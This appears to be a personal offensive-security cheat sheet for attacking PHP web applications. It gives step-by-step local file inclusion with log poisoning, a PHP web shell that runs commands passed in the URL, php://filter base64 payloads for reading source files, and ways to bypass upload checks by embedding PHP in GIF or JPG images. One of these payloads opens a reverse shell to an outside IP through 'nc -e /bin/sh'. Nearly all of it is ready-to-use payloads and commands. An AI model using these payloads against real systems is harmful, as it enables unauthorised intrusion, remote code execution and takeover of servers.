Use php local file inclusion + log poisoning to get remote command execution:

	Step 1(host):
		syntax : nc -nv <targetIP> <port>
		example: nc -nv 10.23.12.32 80		
	
	Step 2(host): <?php echo shell_exec($_GET['cmd']); ?>
		      # Entering this over a netcat session might log it into the target's log files,
			allowing us to display and execute the php line via local file inclusion.

	Step 3(host):
		syntax : http://vulnsite.com/vuln.php?cmd=<command>&language=../../../../../../<pathToLogfile>
		example: http://vulnsite.com/vuln.php?cmd=whoami&language=../../../../../../var/html/www/access.log
			 # The logfiles might be in different locations, depending on the target system

Php local file inclusion base64 method:

	example: http://vulnsite.com/?page=php://filter/convert.base64-encode/resource=config
	example: http://vulnsite.com/?page=php://filter/convert.base64-encode/resource=upload
	example: http://vulnsite.com/browse.php?lang=php://filter/convert.base64-encode/resource=index.php HTTP/1.1


Php upload file bypass by embeddig php code into image/gif files:

	#'pikachu.gif' is a random gif I found on the internet, 'shell.php' is the file that contains the malicious php code

	GIF file with php code via gifsicle:
		
		syntax : gifsicle < <random>.gif --comment '<maliciousContent>' > <file>.php.gif
		example: gifsicle < pikachu.gif --comment "<?php system('nc -e /bin/sh 192.168.0.123 443') ?>" > output.php.gif


	JPG file with php code via python:
		
		Step 1: python
		Step 2: aRandomName = open ('pikachu.gif','rb').read()
		Step 3: aRandomName += open ('shell.php','rb').read()
		Step 4: open ('newshell.php.jpg','wb').write(aRandomName)
